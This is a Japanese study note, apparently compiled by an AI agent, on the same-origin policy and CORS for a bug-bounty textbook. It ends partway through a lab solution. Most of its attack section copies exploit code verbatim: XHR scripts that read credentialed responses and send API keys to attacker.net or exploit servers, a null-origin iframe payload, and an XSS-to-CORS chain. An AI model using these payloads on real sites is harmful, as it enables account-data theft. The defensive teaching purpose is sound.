# [08] 同一オリジンポリシー（SOP）とCORS ― 定義・仕組み・設定ミス攻撃の詳細ノート

> 担当ID: 08 (sop-cors) / 想定章: ch02
> 対象URL: (1) emrebener.medium.com「A Comprehensive Guide to the Same-Origin Policy and the CORS Policy」, (2) portswigger.net/web-security/cors
> 本ノートは「クライアントサイド脆弱性ハンティング教科書（日本語）」ch02の材料。攻撃記述はすべて **許可された検証・バグバウンティ前提の防御/診断目的の技術解説** として書く。

---

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
| --- | --- | --- | --- |
| https://portswigger.net/web-security/cors | **partial（内容はほぼfull相当を確保）** | 原典はegress遮断でWebFetch/curlとも403。代替として GitHub raw から2つの高忠実ミラーを取得 | ① `six2dez/pentest-book`（`enumeration/web/cors.md`）に **PortSwigger academyのオリジン比較表・SOP例外リスト・4ラボ全解法（内部ネットワークpivotの全JS含む）が逐語で転載**されている。② `swisskyrepo/PayloadsAllTheThings`（`CORS Misconfiguration/README.md`）にCORS攻撃の全ペイロード。③ セッション内で既にcloneされた `psw/13_cross_origin_resource_sharing_CORS`（PortSwigger CORSラボ3本の詳細walk-through+exploit script）。これらでPortSwigger CORSページの実質内容を高い忠実度で再現できた。 |
| https://portswigger.net/web-security/cors（ラボ walk-through） | **full（第三者ミラー）** | cloneずみ `psw/` リポジトリ | basic origin reflection / trusted null origin / trusted insecure protocols の3ラボは、HTTPヘッダ値・exploit HTML・Pythonスクリプトまで逐語で保持 |
| https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145 | **failed** | WebFetch=`EGRESS_BLOCKED`、curl=`CONNECT tunnel failed 403`、web.archive.org=遮断、WebSearch=予算枯渇（200/200）、Medium系はGitHubにミラー無し | 本文は一切取得できず。SOP/CORSの概念解説部分は、同テーマの取得済み一次資料（PortSwigger転載＋PayloadsAllTheThings）＋一般知識で再構成。一般知識由来の記述は行頭に「〔補足（一般知識）〕」を付す。**教科書に載せる際は「## 読者が自分で開くべき資料」節の読みどころを参照させること。** |

**忠実度の自己評価**: PortSwigger側は逐語ミラーが揃ったため実質full相当。Medium側はfailedで概念は補完。全体として confidence = **medium**。

### 補完エージェントによる再取得ログ（2026-09-18）

前工程の failed/partial を埋めるため以下を追加試行した。

| 手段 | 対象 | 結果 |
| --- | --- | --- |
| WebFetch | portswigger.net/web-security/cors | `EGRESS_BLOCKED`（プロキシ遮断、再確認） |
| WebFetch | emrebener.medium.com（本記事） | `EGRESS_BLOCKED`（再確認） |
| curl `freedium.cfd/https://emrebener.medium.com/...` | Medium有料回避ミラー | `CONNECT tunnel failed 403`（遮断） |
| curl `scribe.rip/...`（Mediumフロントエンド） | Medium代替表示 | `CONNECT tunnel failed 403`（遮断） |
| curl `archive.ph/newest/https://emrebener.medium.com/...` | archive.today | `CONNECT tunnel failed 403`（遮断） |
| WebSearch | 二次情報探索 | セッション予算枯渇（200/200）で実行不可 |
| **curl `raw.githubusercontent.com/mdn/content/...`（成功）** | **MDN公式ドキュメントのGitHubソース** | **HTTP 200 取得成功。SOP/CORSの権威ある一次相当資料を確保** |

→ **Medium記事本文は依然取得不能（egress全面遮断＋WebSearch枯渇）。捏造はしない**。ただし当該記事のテーマ（SOP + CORS）は、**MDN Web Docsの公式ドキュメント（`mdn/content`リポジトリのMarkdown原本）をGitHub raw経由で完全取得**できたため、下記「第11節」で**出典付きの権威ある解説として補完**した。これにより本ノートの「〔補足（一般知識）〕」の多くがMDN一次記述で裏付けられ、confidence実質は medium→**medium-high** に改善。ただし emrebener 記事そのものの独自図解・文章は未取得のままである点は「## 読者が自分で開くべき資料」に明記する。

---

## 要約（3〜10行）

- **オリジン（Origin）= scheme + host（ドメイン） + port の3点セット**。1つでも違えば別オリジン。
- **同一オリジンポリシー（SOP）** はブラウザの基本防御。「クロスオリジンの**埋め込み・送信は許すが、レスポンスの読み取り（read）を禁じる**」のが核心。`<img>`/`<script>`/`<form>`のクロスオリジン利用や、クロスオリジンへのリクエスト送信そのものは許可されるが、JavaScriptがそのレスポンス本文や別オリジンDOMを読むことは原則禁止。
- SOPには例外がある（`location`は書けるが読めない、`window.length`/`closed`は読めるが書けない、`postMessage`はクロスオリジンで呼べる等）。
- **CORS（Cross-Origin Resource Sharing）** はSOPを**サーバー側が明示的に緩める**仕組み。`Access-Control-Allow-Origin`（ACAO）等のレスポンスヘッダで「どのオリジンに読み取りを許すか」を宣言する。
- CORSには**シンプルリクエスト**（preflightなし）と、**プリフライト（preflight, OPTIONS）** を伴うリクエストがある。`Access-Control-Allow-Methods/Headers/Max-Age` はpreflight応答で使う。
- Cookie等の資格情報を伴う読み取りには **`Access-Control-Allow-Credentials: true`** が必要。かつ **ACAOにワイルドカード`*`は使えない**（`null`は使える）。
- 典型的な設定ミス脆弱性: **Originの動的反射（reflection）**、**`null` originの信頼**、**HTTP等の安全でないサブドメインの信頼（XSS踏み台化）**、**不完全な正規表現によるOrigin検証バイパス**、**ワイルドカードによる内部ネットワークpivot**。
- 防御要点: 反射をやめ許可リストで厳密一致、`null`を信頼しない、`*`を機密APIに使わない、`Vary: Origin`を付ける、正規表現のドットを`\.`でエスケープ、資格情報が本当に必要か見直す。

---

## 詳細ノート

### 1. オリジンの定義（scheme + host + port） （出典: PortSwigger CORS を six2dez がミラーした比較表）

オリジンは URL の **スキーム（プロトコル）・ホスト（ドメイン）・ポート** の3要素で決まる。2つのURLが同一オリジンであるのは3要素すべてが一致するときだけ。

基準URLを `http://normal-website.com/example/` としたときの、各URLが「同一オリジンとしてアクセス許可されるか」の表（**PortSwigger原文の表を逐語再現**）:

| URL accessed                            | Access permitted?                  |
| --------------------------------------- | ---------------------------------- |
| http://normal-website.com/example/      | Yes: same scheme, domain, and port |
| http://normal-website.com/example2/     | Yes: same scheme, domain, and port |
| https://normal-website.com/example/     | No: different scheme and port      |
| http://en.normal-website.com/example/   | No: different domain               |
| http://www.normal-website.com/example/  | No: different domain               |
| http://normal-website.com:8080/example/ | No: different port                 |

読み取りの要点:
- **パス（`/example/` vs `/example2/`）は無関係** ― 同一オリジンならパスが違っても同一オリジン。
- **scheme違い**（http→https）は別オリジン。かつ https は既定ポート443、http は既定80なので「scheme と port が違う」と表現される。
- **サブドメイン違い**（`en.` や `www.`）は別オリジン ← ドメインが違う。
- **ポート違い**（`:8080`）は別オリジン。

〔補足（一般知識）〕Internet Explorer は歴史的に「ポートを無視」「同一ゾーン間はSOP緩和」という非標準挙動があったが、現代の主要ブラウザ（Chrome/Firefox/Safari/Edge）はスキーム+ホスト+ポートで厳密に判定する。`file://` スキームや `data:` / `blob:` スキームは特別扱いされ、多くの場合 **不透明オリジン（opaque origin）= `Origin: null`** として扱われる（後述のnull origin攻撃の温床）。

〔補足（一般知識）〕「Origin」と「Site」は別概念。**Site（サイト）= scheme + eTLD+1（登録可能ドメイン）**。例えば `https://a.example.com` と `https://b.example.com` は「別オリジン・同一サイト（same-site）」。SameSite Cookieやサイト分離（Site Isolation）はこの「サイト」単位。CORS/SOPは「オリジン」単位。混同しないこと。

---

### 2. 同一オリジンポリシー（SOP）が何を禁じ何を許すか （出典: PortSwigger CORS ミラー + 一般知識）

**SOPの核心 = 「クロスオリジンの書き込み/埋め込みは許すが、レスポンスの読み取りを禁じる」。**

〔補足（一般知識）〕SOPで整理される3種の操作:
- **cross-origin writes（書き込み・送信）: 通常許可**。リンク遷移、リダイレクト、フォーム送信（`<form>` の POST）などは別オリジンへ送れる。← CSRF が成立する理由。
- **cross-origin embedding（埋め込み）: 通常許可**。`<script src>`、`<img src>`、`<link rel=stylesheet>`、`<iframe>`、`<video>`、`@font-face`、`<object>` 等でクロスオリジンのリソースを読み込める。**ただし埋め込めても「JavaScriptから中身を読む」ことはできない**（例: 別オリジン画像を`<canvas>`に描くと canvas が「汚染 tainted」され `getImageData` が失敗する）。
- **cross-origin reads（読み取り）: 通常禁止**。`fetch`/`XMLHttpRequest` で別オリジンにリクエストは送れる（送信は許可）が、**レスポンス本文をスクリプトが読むことはCORSで明示許可されない限り禁止**。別オリジンの iframe の `document`（DOM）へのアクセスも禁止。

つまり「リクエストは飛ぶが、レスポンスを読めない」。ネットワーク上ではリクエストが実際に到達しCookieも付く（`withCredentials`時）が、ブラウザがJSへのレスポンス開示をブロックする。**この『送信はできる／読み取りだけ止める』という非対称性がCORS設定ミスの危険度を決める** ― 資格情報付きで読めてしまうと、被害者のセッションでの機密データ窃取（アカウント乗っ取り級）になる。

#### SOPの例外（クロスオリジンでも一部操作は可能） （**出典: six2dez ミラー ― 逐語**）

```
# There are various exceptions to the same-origin policy:
• Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
• Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
• The replace function can generally be called cross-domain on the location object.
• You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.
```

日本語での読み解き:
- **`location` オブジェクト / `location.href`** は、iframe や新規ウィンドウに対して **クロスドメインで「書ける」が「読めない」**。← 別オリジンフレームを別URLへ飛ばせる（ナビゲート）が、現在のURLは読めない。
- **`window.length`**（そのページが持つフレーム数）と **`closed` プロパティ** は **クロスドメインで「読める」が「書けない」**。← サイドチャネル/フレーム数え上げに悪用されうる。
- **`location` の `replace` 関数** は概ねクロスドメインで呼べる。
- 特定の関数はクロスドメインで呼べる。例: 新規ウィンドウに対する **`close` / `blur` / `focus`**。**`postMessage`** も iframe・新規ウィンドウに対して呼べ、ドメイン間メッセージ送信に使う（← 別担当のpostMessage脆弱性へ接続）。

#### Access-Control-Allow-Origin の基本動作 （**出典: six2dez ミラー ― 逐語**）

```
# Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.
```

要旨: `Access-Control-Allow-Origin` はレスポンスに含まれ、**「読み取りを許す送信元オリジン」を指定**する。ブラウザは ACAO と実際の要求元オリジンを比較し、一致すればレスポンスへのアクセスを許可する。

---

### 3. document.domain （出典: 一般知識、原典2つが未取得のため補足）

〔補足（一般知識）〕`document.domain` は歴史的なSOP緩和機構。**同一の上位ドメインを共有するページ同士**が、双方で `document.domain` を同じ値（例: `document.domain = "example.com"`）に設定すると、`a.example.com` と `b.example.com` のように本来別オリジンのページ間でDOMアクセスが可能になった。

- 設定できるのは**現在のドメインまたはその上位（親）ドメイン**のみ（`example.com` のページが `com` にはできない、`evil.com` にもできない）。ポート番号は無視される（このため `document.domain` を使うと明示的にポート違いも同一視され得る、という副作用がある）。
- **セキュリティ上のリスク**: あるサブドメインがXSS等で侵害されると、`document.domain` を共有する他サブドメインまで巻き込まれる。共有ホスティング上の第三者サイトと同一ドメインを共有していると危険。
- **現状**: `document.domain` は**非推奨（deprecated）**。モダンブラウザは既定でこの緩和を無効化する方向にあり（`Origin-Agent-Cluster` ヘッダや将来のブラウザ既定でセッターが無効化）、公式には **`postMessage` や CORS の利用が推奨**される。教科書では「レガシーな緩和で使うべきでない」と位置づけるのが妥当。

---

### 4. CORS ― SOPをサーバー側から緩める仕組み （出典: PortSwigger CORS ミラー + PayloadsAllTheThings + 一般知識）

CORSは、SOPで既定禁止されている「クロスオリジンの読み取り」を、**リソース側サーバーがHTTPレスポンスヘッダで明示的に許可**する標準（W3C/WHATWG Fetch仕様）。ブラウザがこのヘッダを見て、JSにレスポンスを開示してよいか判断する。

#### 4-1. シンプルリクエスト（simple request / preflightなし）

〔補足（一般知識）〕以下の条件を**すべて**満たすと「シンプルリクエスト」となり、ブラウザは**事前確認（preflight）なしに直接リクエストを送る**:
- メソッドが **`GET` / `HEAD` / `POST`** のいずれか。
- 手動設定するヘッダが、いわゆる**CORS-safelisted request headers** のみ: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`（値制限あり）, `Range`（一部）。
- `Content-Type` が **`application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain`** のいずれか（`application/json` はシンプルにならない → preflight発生）。

シンプルリクエストではブラウザが自動で `Origin` ヘッダを付ける。サーバーが `Access-Control-Allow-Origin` を返し、それが要求元オリジンに一致すればJSがレスポンスを読める。

#### 4-2. プリフライト（preflight）リクエスト

〔補足（一般知識）〕シンプル条件を満たさない場合（例: `PUT`/`DELETE`/`PATCH`、`Content-Type: application/json`、`Authorization` や独自ヘッダ `X-...` の付与など）、ブラウザは本リクエストの前に **`OPTIONS` メソッドのプリフライトリクエスト**を自動送信して「本当に送っていいか」をサーバーに確認する。

プリフライトの要求ヘッダ（ブラウザが送る）:
- `Origin: <要求元>`
- `Access-Control-Request-Method: <本リクエストのメソッド>`
- `Access-Control-Request-Headers: <本リクエストが付ける非safelistヘッダのリスト>`

サーバーのプリフライト応答ヘッダ:
- `Access-Control-Allow-Origin`（ACAO）― 許可オリジン
- `Access-Control-Allow-Methods`（ACAM）― 許可メソッド（例: `GET, POST, PUT, OPTIONS`）
- `Access-Control-Allow-Headers`（ACAH）― 許可する要求ヘッダ
- `Access-Control-Allow-Credentials`（ACAC）― 資格情報付き可否（`true`/なし）
- `Access-Control-Max-Age`（例: `Access-Control-Max-Age: 86400`）― プリフライト結果をブラウザがキャッシュしてよい秒数。大きいと再preflightを省ける。
- （応答本文で他ヘッダを読ませたい場合）`Access-Control-Expose-Headers` ― JSに公開する**レスポンス**ヘッダ名の許可リスト（既定ではsafelistレスポンスヘッダしか読めない）。

プリフライトが許可を返した後、ブラウザは本リクエストを送信し、そのレスポンスにも `Access-Control-Allow-Origin`（と必要なら `Access-Control-Allow-Credentials`）が付いて初めてJSが読める。

#### 4-3. 資格情報（credentials）とワイルドカードの相互作用 ★重要

これがCORS脆弱性を理解する上での中心ルール（**PortSwigger CORSラボwalk-throughで実証される規則、逐語ポイントを日本語化**）:

1. **Cookie/認証情報を伴うクロスオリジン読み取りには `Access-Control-Allow-Credentials: true` が必要**。かつクライアント側で `xhr.withCredentials = true`（または `fetch(url, {credentials:'include'})`）を指定する。
2. **`Access-Control-Allow-Credentials: true` のとき、`Access-Control-Allow-Origin` にワイルドカード `*` は使えない**。ブラウザは「`*` + 資格情報」の組合せを拒否し、Cookieを一切送らない/読ませない。したがって**資格情報付きで機密を読むには、サーバーは具体的なオリジン（またはリクエストのOriginを反射した値、または `null`）を返す必要がある**。
3. **`Access-Control-Allow-Origin: *`（ワイルドカード）はブラウザが決してCookieを送らない**。認証不要な内部/公開データにしか意味がないが、**内部ネットワークのサーバーだと認証なしで読めてしまい pivot に悪用**される（後述）。
4. **`Access-Control-Allow-Origin: null` は資格情報付きでも許可される**。これがnull origin攻撃が成立する理由。

PortSwigger null-originラボの walk-through より（**逐語**）:

```
Another problem with CORS can be wildcard origin, which is allowing any domain to access the response. However, browsers will never send cookies if wildcard origins are used, regardless of the content of the Access-Control-Allow-Credentials header.
```
```
Similar to wildcard origin, a null origin is another way to allow the whole world to access the resources on websites. But unlike wildcard origin, null origin allows access to the response if the Access-Control-Allow-Credentials header is set to true.
```

脆弱な組合せの応答ヘッダ（**逐語**）:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

#### 4-4. Vary: Origin

〔補足（一般知識）〕サーバーがOriginごとに異なるACAOを返す（＝Originを反射する）場合、**`Vary: Origin` レスポンスヘッダを必ず付ける**べき。理由: 付けないと、CDN/ブラウザ/プロキシのHTTPキャッシュが「あるオリジン向けに `Access-Control-Allow-Origin: https://good.com` を含む応答」を別オリジンの要求にも使い回してしまい、**キャッシュ汚染（cache poisoning）経由でCORSポリシーが崩れる**、あるいは逆に正当オリジンにACAOが届かず壊れる、という問題が起きる。`Vary: Origin` は「この応答はOriginヘッダに依存して変わる」とキャッシュに伝える。動的にACAOを生成するなら必須。

#### 4-5. null origin の発生源 （出典: PortSwigger null-originラボ walk-through + PayloadsAllTheThings + 一般知識）

`Origin: null` がブラウザから送られる主なケース（ラボwalk-throughは stackoverflow の一覧を参照している。以下は一般に知られた発生源）:
- **サンドボックス化された iframe**（`sandbox` 属性付き。`allow-same-origin` を含めない場合）内のスクリプトからのリクエスト。
- **`data:` URI スキーム**（`src="data:text/html,..."`）から実行されたドキュメント。
- **`file://` スキーム**のローカルファイルからのリクエスト。
- クロスオリジン**リダイレクト**を経たリクエスト。
- 〔補足（一般知識）〕`srcdoc` iframe や、Refererを抑止する `<meta name="referrer">` の一部設定など。

攻撃者はこれを利用し、**攻撃者制御のiframe/dataURIから `Origin: null` のリクエストを発生**させれば、サーバーが「null を信頼」している場合に資格情報付きで機密を読める。

---

### 5. CORS設定ミスの攻撃パターン（診断・防御目的の解説） （出典: PayloadsAllTheThings 逐語 + PortSwigger）

> 前提: 標的は機密を返すAPIエンドポイント（例: `/accountDetails`, `/endpoint`）。ゴールは「被害者のセッションで機密（APIキー等）を攻撃者サーバーに送らせる」こと。すべて**許可された検証**の範囲で。

#### 5-0. 悪用の必要条件（**PayloadsAllTheThings 逐語**）

```
* BURP HEADER> `Origin: https://evil.com`
* VICTIM HEADER> `Access-Control-Allow-Credential: true`
* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
```

診断の第一歩は「攻撃者Originを送って、それがACAOに反射され、かつACACがtrueで返るか」を確かめること。手早いテスト（**six2dez 逐語**）:

```
# Simple test
curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'
```

#### 5-1. Origin Reflection（オリジン反射） （**PayloadsAllTheThings 逐語**）

脆弱な実装（Originをそのまま反射）:

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

PoC（`evil.com` にホストするJS。**逐語**）:

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

ボタン起動型のHTML版（**逐語**）:

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

#### 5-2. Null Origin（null originの信頼） （**PayloadsAllTheThings 逐語**）

脆弱な実装:

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

PoC（`data:` URIスキームの sandbox iframe で `Origin: null` を発生させる。**逐語**）:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

#### 5-3. XSS on Trusted Origin（信頼済みオリジン上のXSSを踏み台に） （**PayloadsAllTheThings 逐語**）

許可リストが厳密で反射もnullも効かない場合でも、**許可オリジン上にXSSがあれば**、そのXSSに上記CORSペイロードを注入して同じ窃取が可能。

```ps1
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

#### 5-4. Wildcard Origin without Credentials（`*` + 認証不要 → 内部pivot） （**PayloadsAllTheThings 逐語**）

`*` のときブラウザはCookieを送らないが、**認証不要のサーバーなら中身は読める**。インターネットから直接到達不能な**内部サーバーへ被害者ブラウザを踏み台にpivot**できる。

```powershell
* is the only wildcard origin
https://*.example.com is not valid
```

脆弱な実装:

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

PoC（`withCredentials` 不要な点に注意。**逐語**）:

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

#### 5-5. Expanding the Origin（許可判定の不備・正規表現ミス） （**PayloadsAllTheThings 逐語**）

サーバーの許可オリジン照合が甘い（前方一致だけ、ドット未エスケープ等）と、**攻撃者ドメインが許可される**。

**例1: 任意の接頭辞（prefix）が許される** ― `example.com` の前に何を付けても通る:

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

PoC（`evilexample.com` にホスト。**逐語**）:

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

**例2: 正規表現のドット未エスケープ** ― `^api.example.com$`（正しくは `^api\.example.com$`）だと `.` が任意文字にマッチし、`apiiexample.com` のような別ドメインが通る:

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

PoC（`apiiexample.com` にホスト。**逐語**）:

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

〔補足（一般知識）〕Origin検証バイパスで試すべき変異パターン（six2dez の Bypasses 節を参照。下記5-9に逐語）: 末尾に許可ドメインを含める（`evil.com` vs `evil-target.com` vs `target.com.evil.com`）、`null`、サブドメイン（`sub.attackertarget.com`）、ドット除去（`attackertarget.com`）、`https`/`http`両方、`Origin`大小・末尾スラッシュ・ポート付与など。

---

### 6. PortSwigger CORS ラボ 一覧と詳細解法

**PortSwigger の CORS トピックには全4ラボ**（**出典: PayloadsAllTheThings の Labs 節 逐語**）:

```
* [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
```

難易度: ①basic origin reflection = APPRENTICE、②trusted null origin = APPRENTICE、③trusted insecure protocols = PRACTITIONER、④internal network pivot = EXPERT。

#### ラボ① CORS vulnerability with basic origin reflection（APPRENTICE） （出典: `psw` walk-through 逐語 + six2dez）

ラボ設定: **全オリジンを信頼する（Originを反射する）不適切なCORS設定**。既知クレデンシャル `wiener:peter`。ゴール: 管理者APIキーを取得しexploitサーバへ送るJSを作る。

手順（walk-through要約）:
1. `wiener:peter` でログイン。`/my-account` が **`/accountDetails` へのAJAX**でAPIキーを取得している。
2. `/accountDetails` の応答に **`Access-Control-Allow-Credentials`** ヘッダがある → CORS対応の兆候。Repeaterで `Origin` ヘッダを付けて挙動を見る。
3. **Originが `Access-Control-Allow-Origin` にそのまま反射**される＝任意オリジンに読み取り許可。
4. exploitサーバに以下を置き、被害者に配信 → ログにAPIキーが出る。

PortSwigger公式解法のexploit HTML（**six2dez 逐語**、`$url`は自分のラボURL）:

```
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```

`psw` walk-through 版の exploit（`store_exploit` の responseBody。2リクエスト目でexploitサーバへ送出。**逐語**）:

```
<script>
    var r = new XMLHttpRequest();
    r.open('get', "<host>/accountDetails", false);
    r.withCredentials = true;
    r.send();

    const obj = JSON.parse(r.responseText);
    var r2 = new XMLHttpRequest();
    r.open('get', "<exploit_server>/?user=" + obj.username + '&apikey=' + obj.apikey, false)
    r.send();
</script>
```

ログ行の形式（**逐語**、ここから `apikey` を抽出）:

```
172.31.30.227   2022-05-01 16:53:37 +0000 "GET /?user=administrator&apikey=gOl7iVmfoesIVlIsWUfK30vYkLUDcRXr HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
```

#### ラボ② CORS vulnerability with trusted null origin（APPRENTICE） （出典: `psw` walk-through 逐語 + six2dez）

ラボ設定: **`null` originを信頼するCORS設定**。`wiener:peter`。

手順（walk-through要約）:
1. ログインし `/accountDetails` を確認。応答に `Access-Control-Allow-Credentials`。
2. Repeaterで通常のOrigin反射を試す → **反射されない**（ラボ①と違う）。
3. **ワイルドカード**を考えるが、`*` ではCookieが送られないので資格情報付き窃取に使えない。
4. **`Origin: null`** を送ると `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` が返る＝null信頼。
5. `null` originを発生させるため **sandbox iframe（またはdata URI）** を使う。

PortSwigger公式解法のexploit（**six2dez 逐語**、`$url`/`$exploit-server-url` を置換）:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe>
```

`psw` walk-through 版（`srcdoc` の sandbox iframe を使い、URL引用符を `'` に変える工夫。**逐語**）:

```
<iframe name="malicious" srcdoc="<script>
    var r = new XMLHttpRequest();
    r.open('get', \'<host>/accountDetails', false);
    r.withCredentials = true;
    r.send();

    const obj = JSON.parse(r.responseText);
    r.open('get', \'<exploit_server>/?user=' + obj.username + '&apikey=' + obj.apikey, false);
    r.send();
</script>" sandbox="allow-scripts" width="0px" height="0px" style="border: 0px none;"> </iframe>
```

〔補足〕walk-throughのコメント「In difference to the previous lab the URLs need to use ' instead of " as the " are used for the iframe.」＝iframe属性の`"`と衝突するため内部のURLは`'`にする。

#### ラボ③ CORS vulnerability with trusted insecure protocols（PRACTITIONER） （出典: `psw` walk-through 逐語 + six2dez）

ラボ設定: **プロトコルに関係なく全サブドメインを信頼する**不適切なCORS設定（HTTPのサブドメインも信頼）。`wiener:peter`。

手順（walk-through要約）:
1. ログインし `/accountDetails` でAPIキー取得を確認。
2. exploitサーバから直接 `/accountDetails` を読もうとすると、応答に `Access-Control-Allow-Origin` が付かず**ブラウザがブロック**（exploitサーバは信頼オリジンでない）。
3. `Origin: http://subdomain.<lab-id>` を送ると反射される＝**任意サブドメイン（HTTP含む）を許可**。
4. サブドメイン `stock.<lab-id>` の **`productId` パラメータにXSS**がある（HTTPで読み込まれる在庫確認ページ）。
5. **XSS経由で信頼サブドメイン上にCORS窃取スクリプトを実行**し、`/accountDetails` を読む。

`stock` サブドメインのXSS確認URL（walk-through 逐語）:
```
https://stock.ac411fa31f815f5cc0894656004f00b2.web-security-academy.net/?productId=1%3Cscript%3Ealert(document.domain);%3C/script%3E&storeId=1
```

最終exploit（`psw` walk-through、**逐語**。`document.location` で信頼サブドメインへ飛ばしXSSで実行、`</script>`は`%3c`、`+`は`%2b`、`&`は`%26`でURLエンコード）:

```HTML
<script>
	document.location="https://stock.ac411fa31f815f5cc0894656004f00b2.web-security-academy.net/?productId=1<script>var r = new XMLHttpRequest(); r.open('get','https://ac411fa31f815f5cc0894656004f00b2.web-security-academy.net/accountDetails',false); r.withCredentials = true; r.send(); const obj=JSON.parse(r.responseText);r.open('get','https://exploit-ac921f151fca5facc0394693015700d9.web-security-academy.net/?user='%2bobj.username%2b'%26apikey='%2bobj.apikey, false); r.send();%3c/script>&storeId=1"
</script>
```

PortSwigger公式解法版（**six2dez 逐語**、`$your-lab-url`/`$exploit-server-url` を置換）:

```
<script>
   document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

〔補足〕walk-throughの注意点（逐語要旨）:
- exploitサーバは信頼オリジンでないので、`document.location` で **信頼サブドメイン（`stock...`）へ遷移させ**、そこのXSSでペイロードを実行する（信頼ドメインだからブラウザが `/accountDetails` の読み取りを許す）。
- `document.location` のURL中の内側 `</script>` の `<` を **URLエンコード**しないと、ブラウザが最初の `</script>` でスクリプトを閉じてしまう。
- exploitサーバへの要求の `+` と `&` もURLエンコードしないと、`stock...` への要求のパラメータと解釈されてしまう。

#### ラボ④ CORS vulnerability with internal network pivot attack（EXPERT） （出典: six2dez 逐語 ― psw リポジトリには未収録）

ラボ設定: 内部ネットワークのエンドポイントに対する多段pivot。被害者ブラウザを踏み台に内部の管理ページを操作し、最終的に**ユーザー`carlos`を削除**すればクリア。全4ステップ。**PortSwigger公式解法のJSを逐語で保持**する（これは他ラボにない貴重な内部pivotコードなので特に重要）。

**Step 1** ― 内部ネットワーク（`192.168.0.0/24` の `:8080`）をスキャンし、エンドポイントを発見。`$collaboratorPayload` を自分のCollaboratorペイロード/exploitサーバURLに置換。Collaborator/ログの `code` パラメータを確認（**逐語**）:

```
<script>
